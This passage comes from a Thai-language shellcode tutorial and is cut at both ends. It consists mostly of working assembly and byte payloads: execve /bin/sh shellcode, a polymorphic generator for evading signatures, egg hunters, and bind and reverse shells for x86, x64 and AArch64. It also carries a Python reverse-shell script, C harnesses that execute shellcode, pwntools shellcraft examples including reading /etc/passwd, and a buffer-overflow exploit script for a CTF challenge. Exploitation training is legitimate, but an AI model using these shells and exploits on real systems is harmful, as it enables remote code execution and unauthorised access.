    xchg ecx, esp       ; ← แทน mov ecx, esp
    mov al, 11
    int 0x80
```

### Polymorphic Generator (Python)

```python
#!/usr/bin/env python3
# polymorphic_gen.py
# Generator อย่างง่ายสำหรับ execve shellcode

import random

def gen_execve_32():
    """สร้าง execve shellcode แบบ polymorphic"""
    
    # เลือก register สำหรับ null
    null_reg = random.choice(['eax', 'ecx', 'edx', 'edi'])
    
    # เลือกวิธี clear register
    clear_method = random.choice(['xor', 'sub', 'and'])
    
    # สร้าง instructions
    code = []
    
    # Clear register
    if clear_method == 'xor':
        code.append(f'xor {null_reg}, {null_reg}')
    elif clear_method == 'sub':
        code.append(f'sub {null_reg}, {null_reg}')
    else:
        code.append(f'and {null_reg}, 0')
    
    # Push string
    code.append(f'push {null_reg}')
    
    # Randomize string push order (ยังต้อง maintain correctness)
    code.append('push 0x68732f2f')
    code.append('push 0x6e69622f')
    code.append('mov ebx, esp')
    
    # Insert junk
    junk_count = random.randint(0, 3)
    junk_ops = ['nop', f'push {null_reg}', f'pop {null_reg}']
    for _ in range(junk_count):
        code.append(random.choice(junk_ops))
    
    code.append(f'push {null_reg}')
    code.append('push ebx')
    code.append('mov ecx, esp')
    
    # syscall setup
    if null_reg != 'eax':
        code.append('xor eax, eax')
    code.append('mov al, 11')
    code.append('int 0x80')
    
    return '\n'.join(code)

# สร้างหลาย versions
for i in range(3):
    print(f"\n=== Version {i+1} ===")
    print(gen_execve_32())
```

---

## Egg Hunter Shellcode {#egg-hunter}

Egg Hunter ใช้เมื่อมีพื้นที่จำกัดสำหรับ shellcode แต่สามารถวาง payload ใหญ่ๆ ที่อื่นได้

### แนวคิด

```
Stage 1: Egg Hunter (shellcode เล็ก ~32 bytes)
  - ค้นหา "egg" (signature พิเศษ) ใน memory
  - ค้นหา virtual address space ทั้งหมด
  - เมื่อพบ egg → jump ไปที่ payload

Stage 2: Real Shellcode (ขนาดเท่าใดก็ได้)
  - นำหน้าด้วย egg signature
  - วางไว้ที่ไหนก็ได้ใน memory (heap, stack, BSS, ...)
```

### Egg ที่ดีควรเป็น

```
1. ไม่มีใน shellcode เอง
2. ไม่มีใน code/data ปกติของโปรแกรม
3. ยาว 8 bytes (4-byte egg ซ้ำ 2 ครั้ง)
   เหตุผล: ลด false positive
   
ตัวอย่าง eggs:
  0x50905090 x2 = "\x90\x50\x90\x50\x90\x50\x90\x50" 
  "w00tw00t" = \x77\x30\x30\x74\x77\x30\x30\x74
  "EGGE" x2 = \x45\x47\x47\x45\x45\x47\x47\x45
```

### Egg Hunter (Linux 32-bit) - syscall method

```nasm
; egg_hunter_32.asm
; ใช้ access() syscall เพื่อตรวจว่า memory page readable
; ถ้า read ได้ → ค้นหา egg

; EGG = 0x50905090 (ซ้ำ 2 ครั้ง = 8 bytes)

section .text
global _start

_start:
    xor edx, edx            ; edx = page address (เริ่มจาก 0)
    
next_page:
    or dx, 0x0fff           ; round to page boundary (4096 = 0x1000)
    
next_addr:
    inc edx                 ; edx++ (4096-aligned + 1, then increment)
    
    ; ใช้ access() syscall เพื่อตรวจ accessibility
    ; access(path, mode) = syscall 33 (32-bit)
    ; ถ้า page ไม่ readable → EFAULT
    lea ebx, [edx]
    push byte 33            ; sys_access
    pop eax
    int 0x80
    
    ; ตรวจสอบ return value
    cmp al, 0xf2            ; EFAULT = 0xfffffff2, low byte = 0xf2
    jz next_page            ; ถ้า page ไม่ accessible → ข้ามทั้ง page
    
    ; page accessible → ค้นหา egg
    mov eax, 0x50905090     ; egg marker
    cmp [edx], eax          ; เปรียบเทียบ 4 bytes แรก
    jnz next_addr           ; ไม่ตรง → ลองที่ address ถัดไป
    
    cmp [edx+4], eax        ; เปรียบเทียบ 4 bytes ถัดไป (ต้องเป็น egg อีกครั้ง)
    jnz next_addr
    
    ; พบ egg! → jump ไปที่ payload (หลัง 8-byte egg)
    jmp edx
```

### Egg Hunter (Linux 64-bit)

```nasm
; egg_hunter_64.asm
; ใช้ access() syscall สำหรับ 64-bit Linux

bits 64
global _start

; EGG = 0x7465677365676757 ("Wegg" x2 sort of)
; ใช้: 0x9090509090905090 (NOP-heavy pattern)

_start:
    xor rdx, rdx            ; start address = 0
    
next_page:
    or dx, 0x0fff
    
next_addr:
    inc rdx
    
    ; access syscall (21 ใน x86-64)
    lea rdi, [rdx]
    xor rsi, rsi
    push 21
    pop rax
    syscall
    
    cmp al, 0xf2            ; EFAULT?
    jz next_page
    
    ; ค้นหา egg
    mov rax, 0x9090509090905090  ; 8-byte egg
    cmp [rdx], rax
    jnz next_addr
    
    ; พบ! jump ไปที่ payload
    lea rax, [rdx + 8]      ; ข้ามผ่าน egg
    jmp rax
```

### การใช้ Egg Hunter ใน Exploit

```python
#!/usr/bin/env python3
# egg_hunter_exploit.py

from pwn import *

# Egg marker
EGG = b'\x90\x50\x90\x50\x90\x50\x90\x50'  # 8 bytes

# Egg hunter shellcode (32-bit, ~35 bytes)
egg_hunter = (
    b'\x31\xd2'             # xor edx, edx
    b'\x66\x81\xca\xff\x0f' # or dx, 0x0fff
    b'\x42'                  # inc edx
    b'\x8d\x1a'             # lea ebx, [edx]
    b'\x6a\x21'             # push 21 (access syscall)
    b'\x58'                  # pop eax
    b'\xcd\x80'             # int 0x80
    b'\x3c\xf2'             # cmp al, 0xf2
    b'\x74\xef'             # jz next_page
    b'\xb8\x90\x50\x90\x50' # mov eax, egg
    b'\x39\x02'             # cmp [edx], eax
    b'\x75\xee'             # jnz next_addr
    b'\x39\x42\x04'         # cmp [edx+4], eax
    b'\x75\xe9'             # jnz next_addr
    b'\xff\xe2'             # jmp edx
)

print(f"Egg hunter size: {len(egg_hunter)} bytes")

# Real shellcode (preceded by egg)
real_shellcode = EGG + (
    b'\x31\xc0'             # xor eax, eax
    b'\x50'                  # push eax
    b'\x68\x2f\x2f\x73\x68' # push "//sh"
    b'\x68\x2f\x62\x69\x6e' # push "/bin"
    b'\x89\xe3'             # mov ebx, esp
    b'\x50'                  # push eax
    b'\x53'                  # push ebx
    b'\x89\xe1'             # mov ecx, esp
    b'\xb0\x0b'             # mov al, 11
    b'\xcd\x80'             # int 0x80
)

print(f"Real shellcode size: {len(real_shellcode)} bytes (including egg)")
```

---

## Bind Shell Shellcode {#bind-shell}

Bind shell เปิด port รอรับ connection แล้วให้ shell

### System Calls ที่ใช้

```
socket()   - สร้าง socket
bind()     - ผูก socket กับ port
listen()   - รอ connection
accept()   - รับ connection
dup2()     - redirect stdin/stdout/stderr ไปที่ socket
execve()   - execute /bin/sh
```

### Bind Shell (32-bit)

```nasm
; bind_shell_32.asm
; Bind shell on port 4444 (0x115c)

section .text
global _start

_start:
    ; === socket(AF_INET, SOCK_STREAM, 0) ===
    ; ใช้ socketcall() (syscall 102) สำหรับ 32-bit
    ; socketcall(SYS_SOCKET=1, [AF_INET, SOCK_STREAM, 0])
    
    xor eax, eax
    xor ebx, ebx
    
    ; สร้าง args array บน stack
    push eax                ; 0 (protocol)
    push byte 1             ; SOCK_STREAM
    push byte 2             ; AF_INET
    mov ecx, esp            ; ecx = args
    
    push byte 1             ; SYS_SOCKET
    pop ebx
    
    push byte 102           ; socketcall
    pop eax
    int 0x80
    
    ; eax = socket fd
    mov edi, eax            ; edi = sockfd (save)
    
    ; === bind(sockfd, {AF_INET, port, INADDR_ANY}, 16) ===
    ; struct sockaddr_in: {2, port_be, 0, ...}
    
    xor eax, eax
    push eax                ; INADDR_ANY = 0
    push word 0x5c11        ; port 4444 in big-endian (0x115c)
    push word 2             ; AF_INET
    mov ecx, esp            ; ecx = sockaddr
    
    push byte 16            ; sizeof(sockaddr_in)
    push ecx                ; ptr to sockaddr
    push edi                ; sockfd
    mov ecx, esp            ; args array
    
    push byte 2             ; SYS_BIND
    pop ebx
    
    push byte 102
    pop eax
    int 0x80
    
    ; === listen(sockfd, 0) ===
    xor eax, eax
    push eax                ; backlog = 0
    push edi                ; sockfd
    mov ecx, esp
    
    push byte 4             ; SYS_LISTEN
    pop ebx
    
    push byte 102
    pop eax
    int 0x80
    
    ; === accept(sockfd, 0, 0) ===
    xor eax, eax
    push eax
    push eax
    push edi
    mov ecx, esp
    
    push byte 5             ; SYS_ACCEPT
    pop ebx
    
    push byte 102
    pop eax
    int 0x80
    
    ; eax = client socket fd
    mov esi, eax            ; esi = client_fd
    
    ; === dup2(client_fd, 0/1/2) ===
    ; redirect stdin, stdout, stderr
    xor ecx, ecx
    mov cl, 3

dup_loop:
    dec ecx
    push byte 63            ; dup2 syscall
    pop eax
    mov ebx, esi            ; client_fd
    int 0x80
    
    test ecx, ecx
    jnz dup_loop
    
    ; === execve("/bin/sh", ["/bin/sh", NULL], NULL) ===
    xor eax, eax
    push eax
    push 0x68732f2f
    push 0x6e69622f
    mov ebx, esp
    push eax
    push ebx
    mov ecx, esp
    mov al, 11
    int 0x80
```

### Bind Shell (64-bit)

```nasm
; bind_shell_64.asm
; Direct syscalls (ไม่ใช้ socketcall)

bits 64
global _start

_start:
    ; === socket(AF_INET=2, SOCK_STREAM=1, 0) ===
    ; syscall 41 = socket
    xor rdi, rdi
    add dil, 2              ; AF_INET
    xor rsi, rsi
    inc rsi                 ; SOCK_STREAM
    xor rdx, rdx            ; protocol = 0
    xor rax, rax
    add al, 41              ; sys_socket
    syscall
    mov rdi, rax            ; rdi = sockfd
    
    ; === setsockopt (optional, SO_REUSEADDR) ===
    ; skip for brevity
    
    ; === bind(sockfd, {AF_INET, 4444, 0}, 16) ===
    ; struct sockaddr_in: family(2), port(2 BE), addr(4), pad(8)
    sub rsp, 16
    mov word [rsp], 2       ; AF_INET
    mov word [rsp+2], 0x5c11 ; port 4444 big-endian
    mov dword [rsp+4], 0    ; INADDR_ANY
    
    ; syscall 49 = bind
    ; rdi already = sockfd
    mov rsi, rsp            ; ptr to sockaddr_in
    mov rdx, 16             ; sizeof
    xor rax, rax
    add al, 49
    syscall
    
    ; === listen(sockfd, 0) ===
    ; syscall 50 = listen
    ; rdi already = sockfd
    xor rsi, rsi
    xor rax, rax
    add al, 50
    syscall
    
    ; === accept(sockfd, 0, 0) ===
    ; syscall 43 = accept
    ; rdi already = sockfd
    xor rsi, rsi
    xor rdx, rdx
    xor rax, rax
    add al, 43
    syscall
    mov rbx, rax            ; rbx = client_fd
    
    ; === dup2(client_fd, 0), dup2(client_fd, 1), dup2(client_fd, 2) ===
    ; syscall 33 = dup2
    xor rcx, rcx
    
dup_loop:
    mov rdi, rbx            ; client_fd
    mov rsi, rcx            ; fd number (0, 1, 2)
    xor rax, rax
    add al, 33
    syscall
    inc rcx
    cmp rcx, 3
    jl dup_loop
    
    ; === execve("/bin//sh", ["/bin//sh", NULL], NULL) ===
    xor rax, rax
    push rax
    mov rbx, 0x68732f2f6e69622f
    push rbx
    mov rdi, rsp
    push rax
    push rdi
    mov rsi, rsp
    xor rdx, rdx
    mov al, 59
    syscall
```

---

## Reverse Shell Shellcode {#reverse-shell}

Reverse shell เชื่อมต่อออกไปหา attacker แล้วให้ shell

### ต่างจาก Bind Shell อย่างไร

```
Bind Shell:
  Target  → [open port 4444]
  Attacker → [connect to target:4444]
  
Reverse Shell:
  Attacker → [listen on port 4444]
  Target   → [connect to attacker:4444]
  
ข้อดีของ Reverse Shell:
  - ไม่ต้องเปิด port บน target
  - ผ่าน firewall ที่กรอง inbound แต่ไม่กรอง outbound
  - Stealthier
```

### Reverse Shell (64-bit)

```nasm
; reverse_shell_64.asm
; Connect back to 127.0.0.1:4444

bits 64
global _start

; LHOST = 127.0.0.1 = 0x7f000001
; LPORT = 4444 = 0x115c (big-endian: 0x5c11)

_start:
    ; === socket(AF_INET, SOCK_STREAM, 0) ===
    xor rdi, rdi
    add dil, 2
    xor rsi, rsi
    inc rsi
    xor rdx, rdx
    xor rax, rax
    add al, 41              ; sys_socket = 41
    syscall
    mov rdi, rax            ; rdi = sockfd
    
    ; === connect(sockfd, {AF_INET, port, ip}, 16) ===
    sub rsp, 16
    xor rax, rax
    mov word [rsp], 2       ; AF_INET
    mov word [rsp+2], 0x5c11 ; port 4444 BE
    mov dword [rsp+4], 0x0100007f ; 127.0.0.1 in network byte order
    ; Network byte order: 127 = 0x7f, 0, 0, 1 = 0x7f000001
    ; Little-endian stored as: 01 00 00 7f
    ; So [rsp+4] = 0x0100007f
    
    mov rsi, rsp            ; ptr to sockaddr_in
    mov rdx, 16
    xor rax, rax
    add al, 42              ; sys_connect = 42
    syscall
    
    ; === dup2(sockfd, 0), dup2(sockfd, 1), dup2(sockfd, 2) ===
    xor rsi, rsi
    
dup_loop:
    ; rdi already = sockfd
    xor rax, rax
    add al, 33              ; sys_dup2
    syscall
    inc rsi
    cmp rsi, 3
    jl dup_loop
    
    ; === execve("/bin//sh") ===
    xor rax, rax
    push rax
    mov rbx, 0x68732f2f6e69622f
    push rbx
    mov rdi, rsp
    push rax
    push rdi
    mov rsi, rsp
    xor rdx, rdx
    mov al, 59
    syscall
```

### Python One-liner Equivalent

```python
#!/usr/bin/env python3
# reverse_shell_python.py (สำหรับเปรียบเทียบ)
# ไม่ใช่ shellcode แต่แสดงให้เห็นว่า logic เดียวกัน

import socket
import subprocess
import os

LHOST = '127.0.0.1'
LPORT = 4444

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((LHOST, LPORT))

# redirect stdin, stdout, stderr
os.dup2(sock.fileno(), 0)  # stdin
os.dup2(sock.fileno(), 1)  # stdout
os.dup2(sock.fileno(), 2)  # stderr

os.execve('/bin/sh', ['/bin/sh'], os.environ)
```

---

## Testing Shellcode with C Harness {#testing-shellcode}

### Method 1: Cast to Function Pointer

```c
// harness_simple.c
// วิธีง่ายที่สุด - แต่ต้องปิด NX

#include <stdio.h>

// วาง shellcode ที่นี่
unsigned char shellcode[] = {
    0x48, 0x31, 0xc0,       // xor rax, rax
    0x50,                    // push rax
    0x48, 0xbb,             // mov rbx, ...
    0x2f, 0x62, 0x69, 0x6e,
    0x2f, 0x2f, 0x73, 0x68,
    0x53,                    // push rbx
    0x48, 0x89, 0xe7,       // mov rdi, rsp
    0x50,                    // push rax
    0x57,                    // push rdi
    0x48, 0x89, 0xe6,       // mov rsi, rsp
    0x48, 0x31, 0xd2,       // xor rdx, rdx
    0xb0, 0x3b,             // mov al, 59
    0x0f, 0x05              // syscall
};

int main() {
    printf("[*] Shellcode length: %lu bytes\n", sizeof(shellcode));
    
    // เรียก shellcode โดยตรง
    (*(void(*)())shellcode)();
    
    return 0;
}
```

```bash
# Compile (ต้องการ execstack)
gcc -z execstack -fno-stack-protector \
    -o harness_simple harness_simple.c
    
# หรือ 32-bit
gcc -m32 -z execstack -fno-stack-protector \
    -o harness32 harness_simple.c

./harness_simple
```

### Method 2: mmap + mprotect (แนะนำ)

```c
// harness_mmap.c
// ทำงานได้แม้ stack เป็น NX
// ใช้ mmap สร้าง executable memory

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

unsigned char shellcode[] = {
    /* ใส่ shellcode bytes ที่นี่ */
    0x48, 0x31, 0xc0,
    0x50,
    0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x73, 0x68,
    0x53, 0x48, 0x89, 0xe7,
    0x50, 0x57, 0x48, 0x89, 0xe6,
    0x48, 0x31, 0xd2,
    0xb0, 0x3b, 0x0f, 0x05
};

int main(int argc, char *argv[]) {
    size_t sc_len = sizeof(shellcode);
    
    printf("[*] Shellcode length: %zu bytes\n", sc_len);
    printf("[*] Shellcode hex: ");
    for (size_t i = 0; i < sc_len; i++) {
        printf("\\x%02x", shellcode[i]);
    }
    printf("\n");
    
    // จัดสรร executable memory ด้วย mmap
    void *exec_mem = mmap(
        NULL,               // let kernel choose address
        sc_len,             // size
        PROT_READ | PROT_WRITE | PROT_EXEC,  // rwx
        MAP_PRIVATE | MAP_ANONYMOUS,          // private, no file
        -1,                 // no file descriptor
        0                   // no offset
    );
    
    if (exec_mem == MAP_FAILED) {
        perror("mmap");
        return 1;
    }
    
    printf("[*] Allocated memory at: %p\n", exec_mem);
    
    // Copy shellcode ไปที่ executable memory
    memcpy(exec_mem, shellcode, sc_len);
    
    printf("[*] Executing shellcode...\n");
    fflush(stdout);
    
    // Execute!
    ((void(*)())exec_mem)();
    
    // cleanup (ถ้า shellcode return)
    munmap(exec_mem, sc_len);
    
    return 0;
}
```

```bash
# Compile - ไม่ต้องการ execstack!
gcc -o harness_mmap harness_mmap.c
./harness_mmap
```

### Method 3: mprotect บน Existing Memory

```c
// harness_mprotect.c
// ทำให้ memory region ที่มีอยู่แล้ว executable

#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

unsigned char shellcode[] = { /* shellcode bytes */ };

int main() {
    // หา page boundary
    size_t page_size = getpagesize();
    void *page_start = (void *)((size_t)shellcode & ~(page_size - 1));
    
    printf("[*] Page size: %zu\n", page_size);
    printf("[*] Shellcode at: %p\n", shellcode);
    printf("[*] Page start: %p\n", page_start);
    
    // ทำให้ page เป็น executable
    if (mprotect(page_start, page_size, 
                 PROT_READ | PROT_WRITE | PROT_EXEC) != 0) {
        perror("mprotect");
        return 1;
    }
    
    printf("[*] Memory is now executable\n");
    
    // Execute shellcode
    ((void(*)())shellcode)();
    
    return 0;
}
```

### Method 4: Debug ด้วย GDB

```bash
# Compile พร้อม debug symbols
gcc -g -z execstack -o shellcode_debug harness_simple.c

# รัน ด้วย GDB
gdb ./shellcode_debug

# ใน GDB:
(gdb) break main
(gdb) run
(gdb) p shellcode         # ดู address ของ shellcode
(gdb) x/10bx shellcode    # ดู bytes
(gdb) x/10i shellcode     # disassemble
(gdb) info registers      # ดู registers ก่อน execute
(gdb) stepi               # step ทีละ instruction
```

### Method 5: ใช้ pwntools

```python
#!/usr/bin/env python3
# test_with_pwntools.py

from pwn import *

context.arch = 'amd64'
context.os = 'linux'

shellcode = asm("""
    xor rax, rax
    push rax
    mov rbx, 0x68732f2f6e69622f
    push rbx
    mov rdi, rsp
    push rax
    push rdi
    mov rsi, rsp
    xor rdx, rdx
    mov al, 59
    syscall
""")

print(f"Shellcode ({len(shellcode)} bytes):")
print(enhex(shellcode))

# Test locally
p = process(shellcode)  # pwntools สร้าง harness อัตโนมัติ!
p.interactive()
```

---

## Extracting Bytes: objdump & pwntools {#extracting-bytes}

### Method 1: objdump

```bash
# Compile ก่อน
nasm -f elf64 shellcode.asm -o shellcode.o

# ดู disassembly
objdump -d -M intel shellcode.o

# Extract hex bytes แบบต่างๆ:

# Method A: awk
objdump -d shellcode.o | grep -oP '(?<=:\t)([0-9a-f]{2} )+' | \
    tr -d ' \n'

# Method B: Python
objdump -d shellcode.o | python3 -c "
import sys, re
output = sys.stdin.read()
bytes_found = re.findall(r'\t([0-9a-f]{2}(?: [0-9a-f]{2})*)\s', output)
print(''.join(b[0].replace(' ', '') for b in bytes_found))
"

# Method C: xxd format
objdump -d shellcode.o | grep -E '^\s+[0-9a-f]+:' | \
    awk '{for(i=2;i<=NF;i++) if(length($i)==2 && $i~/^[0-9a-f]+$/) printf "\\x%s",$i}' | \
    echo

# นับ length
objdump -d shellcode.o | grep -oP '(?<=:\t)([0-9a-f]{2} )+' | \
    tr -d ' \n' | wc -c
# หาร 2 = number of bytes
```

### Method 2: pwntools (แนะนำมากที่สุด)

```python
#!/usr/bin/env python3
# extract_shellcode.py

from pwn import *

context.arch = 'amd64'
context.os = 'linux'
# หรือ context.arch = 'i386' สำหรับ 32-bit

# ใช้ asm() compile โดยตรง
sc = asm("""
    xor rax, rax
    push rax
    mov rbx, 0x68732f2f6e69622f
    push rbx
    mov rdi, rsp
    push rax
    push rdi
    mov rsi, rsp
    xor rdx, rdx
    mov al, 59
    syscall
""")

print(f"Length: {len(sc)} bytes")
print(f"Hex: {sc.hex()}")
print(f"Escaped: {repr(sc)}")

# Format สำหรับ C
print("\nC array:")
print(f"unsigned char shellcode[] = {{")
for i, b in enumerate(sc):
    if i % 8 == 0:
        print("    ", end="")
    print(f"0x{b:02x}", end="")
    if i < len(sc) - 1:
        print(", ", end="")
    if (i+1) % 8 == 0:
        print()
print("\n};")

# ตรวจสอบ bad chars
bad_chars = b'\x00\x0a\x0d'
for i, b in enumerate(sc):
    if bytes([b]) in [bytes([x]) for x in bad_chars]:
        print(f"BAD CHAR at offset {i}: 0x{b:02x}")
```

### Method 3: ใช้ shellcraft (pwntools built-in shellcodes)

```python
#!/usr/bin/env python3
# shellcraft_examples.py

from pwn import *

context.arch = 'amd64'
context.os = 'linux'

# pwntools มี shellcode สำเร็จรูป!

# execve /bin/sh
sh_shellcode = shellcraft.sh()
print("=== execve /bin/sh ===")
print(sh_shellcode)
print(f"Bytes: {enhex(asm(sh_shellcode))}")

# ต่อไปนี้บาง shellcraft ที่ควรรู้:

# Bind shell port 4444
bind_sc = shellcraft.bindsh(4444, 'ipv4')
print("\n=== Bind shell ===")
print(bind_sc[:300] + "...")  # preview

# Reverse shell
rev_sc = shellcraft.connect('127.0.0.1', 4444) + shellcraft.dupsh()
print("\n=== Reverse shell (connect + dupsh) ===")
print(rev_sc[:300] + "...")

# cat /etc/passwd
cat_sc = shellcraft.cat('/etc/passwd')

# read/write
read_sc = shellcraft.read(0, 'rsp', 100)

# สำหรับ ARM64
context.arch = 'aarch64'
arm_sh = asm(shellcraft.sh())
print(f"\nAArch64 /bin/sh shellcode: {len(arm_sh)} bytes")
print(f"Hex: {arm_sh.hex()}")
```

### Method 4: Binary Extraction Script

```bash
#!/bin/bash
# extract_bytes.sh
# Script ครบวงจรสำหรับ extract shellcode

set -e

ASM_FILE="$1"
OUTPUT_FORMAT="${2:-hex}"  # hex, c, python, escaped

if [ -z "$ASM_FILE" ]; then
    echo "Usage: $0 <asm_file> [hex|c|python|escaped]"
    exit 1
fi

# Determine bits (32 or 64)
if grep -q "bits 64" "$ASM_FILE"; then
    FORMAT="elf64"
    ARCH="x86-64"
else
    FORMAT="elf32"
    ARCH="i386"
fi

BASE=$(basename "$ASM_FILE" .asm)
OBJ="${BASE}.o"
BIN="${BASE}.bin"

echo "[*] Assembling $ASM_FILE ($FORMAT)..."
nasm -f "$FORMAT" "$ASM_FILE" -o "$OBJ"

echo "[*] Extracting shellcode..."
# Extract raw bytes (no headers)
objcopy -O binary --only-section=.text "$OBJ" "$BIN"

SIZE=$(wc -c < "$BIN")
echo "[*] Shellcode size: $SIZE bytes"

case "$OUTPUT_FORMAT" in
    hex)
        xxd -p "$BIN" | tr -d '\n'
        echo
        ;;
    escaped)
        xxd -p "$BIN" | tr -d '\n' | sed 's/../\\x&/g'
        echo
        ;;
    c)
        echo "unsigned char shellcode[] = {"
        xxd -p "$BIN" | tr -d '\n' | sed 's/../0x&, /g' | \
            fold -s -w 40 | sed 's/^/    /'
        echo "};"
        echo "size_t shellcode_len = sizeof(shellcode);"
        ;;
    python)
        ESCAPED=$(xxd -p "$BIN" | tr -d '\n' | sed 's/../\\x&/g')
        echo "shellcode = b\"${ESCAPED}\""
        ;;
esac

# Check null bytes
if xxd -p "$BIN" | grep -qo "00"; then
    echo "[!] WARNING: Null bytes detected!"
else
    echo "[+] Clean: No null bytes"
fi

rm -f "$OBJ" "$BIN"
```

---

## ARM AArch64 Shellcode {#arm-aarch64}

### ความแตกต่างจาก x86-64

```
x86-64 vs AArch64:

Architecture:
  x86-64: CISC (variable instruction length)
  AArch64: RISC (fixed 4-byte instructions)

Syscall:
  x86-64: rax = syscall number, syscall instruction
  AArch64: x8 = syscall number, svc #0

Registers:
  x86-64: rax, rbx, rcx, rdx, rsi, rdi, r8-r15
  AArch64: x0-x30, sp, pc, xzr (zero register)

Arguments:
  x86-64: rdi, rsi, rdx, r10, r8, r9
  AArch64: x0, x1, x2, x3, x4, x5
```

### AArch64 System Call Numbers

```
execve: 221
socket: 198
bind:   200
listen: 201
accept: 202
connect: 203
dup2:   33
exit:   93
read:   63
write:  64
```

### Execve Shellcode (AArch64)

```asm
// execve_aarch64.s
// execve("/bin/sh", NULL, NULL) on Linux AArch64

.text
.global _start

_start:
    // === Setup "/bin//sh" string ===
    // "/bin//sh" in hex: 2f 62 69 6e 2f 2f 73 68
    // As 64-bit LE: 0x68732f2f6e69622f
    
    // Load string address ด้วย relative addressing
    adr x1, binsh_str       // x1 = address of string
    
    // Setup args
    mov x0, x1              // x0 = argv[0] = "/bin//sh"
    
    // argv array = [x1, 0]
    // ต้องสร้างบน stack
    str x1, [sp, #-16]!     // push x1 (argv[0])
    str xzr, [sp, #8]       // push NULL (argv[1])
    mov x1, sp              // x1 = argv array
    
    // envp = NULL
    mov x2, xzr
    
    // syscall 221 = execve
    mov x8, #221
    svc #0

// string data
binsh_str:
    .ascii "/bin//sh\0"
```

### AArch64 Assembly Concepts

```asm
// aarch64_concepts.s

// === Register Names ===
// x0-x7:  arguments and return values
// x8:     syscall number
// x9-x15: temp (caller-saved)
// x19-x28: callee-saved
// x29 (fp): frame pointer
// x30 (lr): link register (return address)
// sp:     stack pointer
// pc:     program counter
// xzr:    zero register (always reads 0)
// wzr:    32-bit zero register

// === Common Instructions ===

// MOV
mov x0, #42         // x0 = 42
mov x0, xzr         // x0 = 0
movz x0, #0x4141    // x0 = 0x4141 (zero-extend)
movk x0, #0x4242, lsl #16  // x0[31:16] = 0x4242

// Load/Store
ldr x0, [x1]        // x0 = *x1
str x0, [x1]        // *x1 = x0
ldr x0, [x1, #8]    // x0 = *(x1 + 8)
ldr x0, [x1], #8    // x0 = *x1; x1 += 8 (post-index)
ldr x0, [x1, #8]!   // x1 += 8; x0 = *x1 (pre-index)

// Branch
b label             // unconditional
bl label            // branch + link (call, saves PC to lr)
br x0               // branch to register
blr x0              // branch + link to register
ret                 // return (br lr)
b.eq label          // branch if equal
b.ne label          // branch if not equal

// Stack operations
stp x0, x1, [sp, #-16]!  // push x0, x1
ldp x0, x1, [sp], #16    // pop x0, x1
str x0, [sp, #-8]!        // push x0 (8 bytes)
ldr x0, [sp], #8          // pop x0

// Syscall
svc #0              // supervisor call (syscall)
```

### AArch64 Execve (No Null Bytes)

```asm
// execve_aarch64_nonull.s
// Position independent, no null bytes

.text
.global _start

_start:
    // XOR trick สำหรับ null byte ใน string
    // "/bin//sh" ไม่ต้องการ null ถ้าใช้ exact 8 bytes
    
    // Load "/bin//sh" เป็น immediate ไม่ได้โดยตรง (ใหญ่เกิน)
    // ใช้ movz + movk
    movz x1, #0x622f        // x1[15:0] = "/b"
    movk x1, #0x6e69, lsl #16  // x1[31:16] = "in"
    movk x1, #0x2f2f, lsl #32  // x1[47:32] = "//"
    movk x1, #0x6873, lsl #48  // x1[63:48] = "sh"
    
    // Push ลง stack
    str x1, [sp, #-16]!     // push "/bin//sh"
    
    // Null terminator ทำโดย clear upper register แล้ว push
    // หรือใช้ xzr register
    str xzr, [sp, #8]       // null terminate (อยู่ถัดจาก string)
    
    // x0 = pointer to string
    mov x0, sp
    
    // argv = [ptr, NULL]
    str x0, [sp, #-16]!
    str xzr, [sp, #8]
    mov x1, sp
    
    // envp = NULL
    mov x2, xzr
    
    // syscall execve (221)
    mov x8, #221
    svc #0
```

### ทดสอบ AArch64 บน x86 ด้วย QEMU

```bash
# ติดตั้ง QEMU และ cross-compiler
sudo apt install qemu-user gcc-aarch64-linux-gnu binutils-aarch64-linux-gnu

# Assemble
aarch64-linux-gnu-as execve_aarch64.s -o execve_aarch64.o

# Link
aarch64-linux-gnu-ld execve_aarch64.o -o execve_aarch64

# Run ด้วย QEMU user-mode
qemu-aarch64 ./execve_aarch64

# หรือ แบบ static
qemu-aarch64-static ./execve_aarch64
```

### Extract AArch64 Shellcode

```bash
# Extract bytes
aarch64-linux-gnu-objdump -d execve_aarch64 | \
    python3 -c "
import sys, re
data = sys.stdin.read()
# AArch64 instructions are 4 bytes each, printed differently
matches = re.findall(r':\s+([0-9a-f]{8})\s+', data)
for m in matches:
    # reverse bytes for little-endian
    b = bytes.fromhex(m)[::-1]
    print(b.hex(), end='')
print()
"
```

---

## ตัวอย่างครบวงจร: CTF Shellcode Challenge {#ctf-exercises}

### Challenge 1: Basic Buffer Overflow with Shellcode

```
สถานการณ์:
  - โปรแกรม vulnerable ใน buffer overflow
  - NX disabled (stack executable)
  - No ASLR (หรือรู้ stack address)
  - Buffer 100 bytes
  - Return address อยู่ที่ offset 112
```

```python
#!/usr/bin/env python3
# solve_ctf1.py

from pwn import *

context.arch = 'i386'
context.os = 'linux'

# Shellcode (execve /bin/sh, 32-bit, no nulls)
shellcode = asm("""
    xor eax, eax
    push eax
    push 0x68732f2f
    push 0x6e69622f
    mov ebx, esp
    push eax
    push ebx
    mov ecx, esp
    xor edx, edx
    mov al, 11
    int 0x80
""")

print(f"[*] Shellcode: {len(shellcode)} bytes")

# สมมติ stack address จาก info registers
SHELLCODE_ADDR = 0xffffd6b0  # ต้องปรับตาม environment

# Payload structure:
# [shellcode][padding][return_address]
BUFFER_SIZE = 100
OFFSET_TO_RET = 112  # ต้องหาด้วย cyclic pattern

payload = shellcode
payload += b'\x90' * (OFFSET_TO_RET - len(shellcode))  # NOP sled
payload += p32(SHELLCODE_ADDR)  # overwrite return address

print(f"[*] Payload size: {len(payload)} bytes")

# ส่ง payload
p = process('./vulnerable_program')
# หรือ
# p = remote('ctf.example.com', 1337)

p.recvuntil(b"Input: ")
p.sendline(payload)
p.interactive()
```

### Challenge 2: Shellcode with Bad Chars

```python
#!/usr/bin/env python3
# solve_ctf2.py (bad chars: \x00\x0a\x0d\x20)

from pwn import *

context.arch = 'amd64'

BAD_CHARS = b'\x00\x0a\x0d\x20'

def check_bad_chars(sc, bad):
    for b in bad:
        if bytes([b]) in sc:
            return True
    return False

# พยายาม encode shellcode
shellcode = asm(shellcraft.sh())

if check_bad_chars(shellcode, BAD_CHARS):
